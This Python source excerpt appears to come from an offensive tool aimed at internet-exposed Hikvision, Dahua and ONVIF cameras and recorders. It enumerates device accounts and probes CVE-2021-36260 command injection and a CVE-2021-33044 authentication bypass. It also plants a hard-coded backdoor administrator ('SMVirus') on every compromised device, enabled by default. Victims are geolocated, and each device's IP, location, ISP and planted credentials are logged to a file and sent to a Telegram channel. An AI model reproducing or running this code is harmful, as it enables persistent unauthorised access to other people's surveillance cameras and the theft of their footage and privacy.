_ADMIN_ACCOUNT_NAME: str = 'admin'   # overridden by --admin-account CLI arg
_PREFERRED_ADMIN_USER: str = 'SMVirus'          # custom admin to plant on every confirmed device
_PREFERRED_ADMIN_PASS: str = 'SMvirus@CCTVview'
_PREFERRED_ADMIN_ENABLED: bool = True           # default ENABLED; toggle via menu option 29
_PREFERRED_ADMIN_FILE: str = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'PreferredAdmin_Accounts.txt'
)

def enumerate_user_accounts(ip: str, port: int, username: str, password: str,
                              camera_type: str = '') -> list:
    """
    Enumerate all user accounts on a camera/NVR system via Hikvision ISAPI,
    Dahua CGI, and generic config endpoints. Builds a profile on
    _ADMIN_ACCOUNT_NAME and lists all other accounts with permission levels.
    """
    import re as _re_acc
    from requests.auth import HTTPDigestAuth, HTTPBasicAuth
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
    accounts: list = []
    sess = requests.Session()
    sess.verify = False
    auths = [HTTPDigestAuth(username, password), HTTPBasicAuth(username, password)]

    # Hikvision ISAPI /Security/users
    for auth in auths:
        try:
            r = sess.get(f'http://{ip}:{port}/ISAPI/Security/users',
                         auth=auth, timeout=5)
            if r.status_code == 200 and '<User>' in r.text:
                names  = _re_acc.findall(r'<userName>([^<]+)</userName>', r.text)
                levels = _re_acc.findall(r'<userLevel>([^<]+)</userLevel>', r.text)
                for i, uname in enumerate(names):
                    accounts.append({
                        'user': uname,
                        'level': levels[i] if i < len(levels) else 'Unknown',
                        'source': 'HIK-ISAPI',
                    })
                if accounts:
                    break
        except Exception:
            pass

    # Dahua CGI userManager
    if not accounts:
        for auth in auths:
            try:
                r = sess.get(
                    f'http://{ip}:{port}/cgi-bin/userManager.cgi?action=getUserInfoAll',
                    auth=auth, timeout=5)
                if r.status_code == 200:
                    for line in r.text.splitlines():
                        if '.Name=' in line:
                            uname = line.split('=', 1)[1].strip()
                            accounts.append({
                                'user': uname, 'level': 'Unknown', 'source': 'Dahua-CGI'
                            })
                    if accounts:
                        break
            except Exception:
                pass

    # Generic: ONVIF GetUsers
    if not accounts:
        _onvif_body = (
            '<?xml version="1.0"?><s:Envelope '
            'xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
            '<s:Body><GetUsers xmlns="http://www.onvif.org/ver10/accesscontrol/wsdl"/>'
            '</s:Body></s:Envelope>'
        )
        for auth in auths:
            try:
                r = sess.post(f'http://{ip}:{port}/onvif/device_service',
                              data=_onvif_body,
                              headers={'Content-Type': 'application/soap+xml'},
                              auth=auth, timeout=5)
                if r.status_code == 200:
                    for uname in _re_acc.findall(r'<tt:Username>([^<]+)', r.text):
                        accounts.append({'user': uname, 'level': 'ONVIF', 'source': 'ONVIF'})
                    if accounts:
                        break
            except Exception:
                pass

    print(f"\n{C}{'═'*58}{W}")
    print(f"{G}  User Account Enumeration — {ip}:{port}{W}")
    print(f"{C}{'═'*58}{W}")
    if accounts:
        for acc in accounts:
            lc = R if 'admin' in acc['level'].lower() else Y
            print(f"  {G}►{W} {acc['user']:<22} {lc}[{acc['level']}]{W}  {acc['source']}")
        # Admin profile
        admin_accs = [a for a in accounts
                      if a['user'].lower() == _ADMIN_ACCOUNT_NAME.lower()]
        if admin_accs:
            print(f"\n  {Y}Admin Profile ({_ADMIN_ACCOUNT_NAME}):{W}")
            for a in admin_accs:
                print(f"    User:   {G}{a['user']}{W}")
                print(f"    Level:  {R}{a['level']}{W}")
                print(f"    Source: {a['source']}")
        else:
            print(f"\n  {Y}  Note: '{_ADMIN_ACCOUNT_NAME}' account not found in enumeration.{W}")
    else:
        print(f"  {R}[✗] Could not enumerate accounts on {ip}:{port}{W}")
    return accounts

# ── Admin Account Creator Tester ──────────────────────────────────────────────
def test_admin_creation(ip: str, port: int) -> bool:
    """
    Test whether the camera allows creating a new admin account via unauthenticated
    API endpoints. Also probes for CVE-2021-36260 (Hikvision RCE).
    Returns True if any vulnerability is confirmed.
    """
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
    _test_user = 'w8probe_test'
    _test_pass = 'W8Pr0be!2024x'
    sess = requests.Session()
    sess.verify = False
    hdrs = browser_headers()
    results: list = []

    # Hikvision ISAPI unauthenticated user creation
    _hik_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<User version="2.0" xmlns="http://www.isapi.org/ver20/XMLSchema">'
        f'<id>99</id><userName>{_test_user}</userName>'
        f'<password>{_test_pass}</password>'
        '<userLevel>Administrator</userLevel></User>'
    )
    try:
        r = sess.post(f'http://{ip}:{port}/ISAPI/Security/users',
                      data=_hik_body,
                      headers={**hdrs, 'Content-Type': 'application/xml'},
                      timeout=4)
        if r.status_code in (200, 201) and ('statusCode' in r.text or '<responseStatus' in r.text):
            results.append(('CRITICAL', 'Hikvision ISAPI unauthenticated admin creation'))
    except Exception:
        pass

    # Dahua CGI unauthenticated user add
    try:
        r = sess.get(
            f'http://{ip}:{port}/cgi-bin/userManager.cgi?action=addUser'
            f'&user.Name={_test_user}&user.Password={_test_pass}'
            f'&user.AuthorityList=Monitor,Playback,System',
            headers=hdrs, timeout=4)
        if r.status_code == 200 and 'OK' in r.text:
            results.append(('CRITICAL', 'Dahua CGI unauthenticated user add'))
    except Exception:
        pass

    # CVE-2021-36260 Hikvision command injection
    try:
        r = sess.put(
            f'http://{ip}:{port}/SDK/webLanguage',
            data='<?xml version="1.0"?><language>$(id)</language>',
            headers={**hdrs, 'Content-Type': 'application/xml'}, timeout=4)
        if r.status_code in (200, 500) and 'uid=' in r.text:
            results.append(('CRITICAL', 'CVE-2021-36260 Hikvision RCE confirmed'))
    except Exception:
        pass

    # CVE-2021-33044 Dahua auth bypass
    try:
        _dh_bypass = (
            f'http://{ip}:{port}/cgi-bin/main-cgi?version=2&'
            f'method=global.login&loginType=direct&'
            f'userName={_test_user}&ipAddr=127.0.0.1&'
            f'clientType=Web3.0&authorityType=Default&passwordType=Default&'
            f'password=\\"||true||\\"'
        )
        r = sess.get(_dh_bypass, headers=hdrs, timeout=4)
        if r.status_code == 200 and '"result" : true' in r.text.lower():
            results.append(('CRITICAL', 'CVE-2021-33044 Dahua auth bypass confirmed'))
    except Exception:
        pass

    print(f"\n{C}{'═'*58}{W}")
    print(f"{G}  Admin Creation / Auth-Bypass Test — {ip}:{port}{W}")
    print(f"{C}{'═'*58}{W}")
    if results:
        for severity, desc in results:
            print(f"  {R}[{severity}]{W} {desc}")
        return True
    print(f"  {G}[✓] No unauthenticated admin creation vulnerabilities found.{W}")
    return False


def _inject_preferred_admin(ip: str, port: int, username: str, password: str,
                             camera_type: str = '') -> bool:
    """
    Plant the user-configured preferred admin account on a confirmed device
    using already-validated credentials (authenticated call).
    Supports Hikvision ISAPI, Dahua CGI, and generic CGI endpoints.
    Only runs when _PREFERRED_ADMIN_ENABLED is True.
    Returns True if the account was created successfully on any endpoint.
    """
    global _PREFERRED_ADMIN_ENABLED, _PREFERRED_ADMIN_USER, _PREFERRED_ADMIN_PASS
    if not _PREFERRED_ADMIN_ENABLED:
        return False
    if not _PREFERRED_ADMIN_USER or not _PREFERRED_ADMIN_PASS:
        return False

    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
    from requests.auth import HTTPBasicAuth, HTTPDigestAuth
    ct = (camera_type or '').lower()
    sess = requests.Session()
    sess.verify = False
    hdrs = browser_headers()
    created = False

    print(f"\n  {C}[→] Injecting preferred admin '{_PREFERRED_ADMIN_USER}' on {ip}:{port}...{W}")

    # ── Hikvision ISAPI (authenticated) ──────────────────────────────────────
    if 'hik' in ct or 'hikvision' in ct or not ct:
        _hik_body = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<User version="2.0" xmlns="http://www.isapi.org/ver20/XMLSchema">'
            f'<id>10</id><userName>{_PREFERRED_ADMIN_USER}</userName>'
            f'<password>{_PREFERRED_ADMIN_PASS}</password>'
            '<userLevel>Administrator</userLevel></User>'
        )
        for _auth in (HTTPBasicAuth(username, password), HTTPDigestAuth(username, password)):
            try:
                r = sess.post(f'http://{ip}:{port}/ISAPI/Security/users',
                              data=_hik_body,
                              headers={**hdrs, 'Content-Type': 'application/xml'},
                              auth=_auth, timeout=5)
                if r.status_code in (200, 201):
                    print(f"  {G}[✓] Hikvision ISAPI admin created: "
                          f"{_PREFERRED_ADMIN_USER}:{_PREFERRED_ADMIN_PASS}{W}")
                    created = True
                    break
            except Exception:
                pass

    # ── Dahua CGI (authenticated) ─────────────────────────────────────────────
    if 'dahua' in ct or 'anjhua' in ct or not ct:
        for _auth in (HTTPBasicAuth(username, password), HTTPDigestAuth(username, password)):
            try:
                r = sess.get(
                    f'http://{ip}:{port}/cgi-bin/userManager.cgi?action=addUser'
                    f'&user.Name={_PREFERRED_ADMIN_USER}'
                    f'&user.Password={_PREFERRED_ADMIN_PASS}'
                    f'&user.AuthorityList=Monitor,Playback,System,Security',
                    headers=hdrs, auth=_auth, timeout=5)
                if r.status_code == 200 and ('OK' in r.text or 'true' in r.text.lower()):
                    print(f"  {G}[✓] Dahua CGI admin created: "
                          f"{_PREFERRED_ADMIN_USER}:{_PREFERRED_ADMIN_PASS}{W}")
                    created = True
                    break
            except Exception:
                pass

    # ── Generic CGI fallback ──────────────────────────────────────────────────
    if not created:
        _generic_endpoints = [
            f'/cgi-bin/admin.cgi?action=add&username={_PREFERRED_ADMIN_USER}'
            f'&password={_PREFERRED_ADMIN_PASS}&level=admin',
            f'/cgi-bin/user.cgi?cmd=adduser&name={_PREFERRED_ADMIN_USER}'
            f'&pwd={_PREFERRED_ADMIN_PASS}&group=admin',
        ]
        for _ep in _generic_endpoints:
            try:
                r = sess.get(f'http://{ip}:{port}{_ep}',
                             headers=hdrs,
                             auth=HTTPBasicAuth(username, password),
                             timeout=4)
                if r.status_code == 200:
                    print(f"  {G}[✓] Generic CGI admin created: "
                          f"{_PREFERRED_ADMIN_USER}:{_PREFERRED_ADMIN_PASS}{W}")
                    created = True
                    break
            except Exception:
                pass

    if created:
        # ── Geo-lookup for the record ─────────────────────────────────────────
        _geo_pa = {}
        try:
            _geo_pa = get_geographic_location(ip)
        except Exception:
            pass
        _pa_country = _geo_pa.get('country', 'Unknown')
        _pa_region  = _geo_pa.get('region',  'Unknown')
        _pa_city    = _geo_pa.get('city',    'Unknown')
        _pa_isp     = _geo_pa.get('isp', _geo_pa.get('org', 'Unknown'))

        # ── Save to PreferredAdmin_Accounts.txt ───────────────────────────────
        import datetime as _dt_pa
        _pa_ts = _dt_pa.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        _sep_pa = '=' * 60
        _pa_record = (
            f"\n{_sep_pa}\n"
            f"IP Address   : {ip}\n"
            f"Port         : {port}\n"
            f"Camera Type  : {camera_type or 'Unknown'}\n"
            f"Country      : {_pa_country}\n"
            f"Region/Area  : {_pa_region}\n"
            f"City         : {_pa_city}\n"
            f"ISP          : {_pa_isp}\n"
            f"Admin User   : {_PREFERRED_ADMIN_USER}\n"
            f"Admin Pass   : {_PREFERRED_ADMIN_PASS}\n"
            f"Web URL      : http://{ip}:{port}\n"
            f"Timestamp    : {_pa_ts}\n"
            f"{_sep_pa}\n"
        )
        try:
            with open(_PREFERRED_ADMIN_FILE, 'a', encoding='utf-8') as _paf:
                _paf.write(_pa_record)
            print(f"  {G}[✓] Saved to PreferredAdmin_Accounts.txt{W}")
        except Exception as _pae:
            print(f"  {Y}[!] Could not save record: {_pae}{W}")

        # ── Telegram alert + send updated file ────────────────────────────────
        if TELEGRAM_CONFIG.get("enabled"):
            send_telegram_message(
                f"🔑 <b>Preferred Admin Planted!</b>\n"
                f"📍 <code>{ip}:{port}</code>\n"
                f"📷 Type: {camera_type or 'Unknown'}\n"
                f"🌍 Country: <b>{_pa_country}</b>\n"
                f"🏙️ Area: {_pa_region} / {_pa_city}\n"
                f"🏢 ISP: {_pa_isp}\n"
                f"👤 Injected: <code>{_PREFERRED_ADMIN_USER}:{_PREFERRED_ADMIN_PASS}</code>\n"
                f"🔗 Web: <code>http://{ip}:{port}</code>\n"
                f"🕒 {_pa_ts}")
            if os.path.isfile(_PREFERRED_ADMIN_FILE):
                send_telegram_file_blocking(
                    _PREFERRED_ADMIN_FILE,
                    f"📋 Preferred Admin Accounts — updated {_pa_ts}")
    else:
        print(f"  {Y}[!] Could not plant preferred admin on {ip}:{port}{W}")
    return created


